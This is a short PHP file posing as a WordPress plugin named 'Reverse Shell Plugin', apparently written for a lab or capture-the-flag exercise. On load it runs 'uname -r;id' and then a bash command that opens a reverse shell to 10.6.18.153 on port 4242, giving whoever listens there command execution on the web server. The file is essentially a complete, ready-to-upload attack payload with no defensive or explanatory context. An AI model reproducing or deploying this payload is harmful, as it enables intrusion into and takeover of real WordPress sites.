<?php
// pluagin vuln for wordpress 
/*
This is a new plugin ;
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: You
* Author URI: localhost/
*/
// note that the previous one should be commited 
exec("uname -r;id");
exec("/bin/bash -c 'sh -i >& /dev/tcp/10.6.18.153/4242 0>&1'");
?>
